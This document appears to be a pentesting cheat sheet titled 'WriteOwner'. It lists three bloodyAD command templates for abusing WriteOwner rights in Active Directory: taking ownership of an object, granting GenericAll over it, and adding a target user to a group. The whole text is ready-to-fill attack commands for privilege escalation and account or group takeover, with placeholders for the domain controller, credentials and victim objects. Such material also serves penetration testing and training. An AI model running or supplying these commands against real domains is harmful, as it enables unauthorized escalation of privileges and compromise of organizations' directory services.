# WriteOwner

## 1. Set Owner
```
bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' set owner "NEW_OWNER" '<USERNAME>'
```

## 2. Add GenericAll
```
bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' add genericAll "<CN_PATH>" '<TARGET_USERNAME>'
```

## 3. Add GroupMember
```
bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' add groupMember "<VICTIM_OU>" '<TARGET_USERNAME>'
```
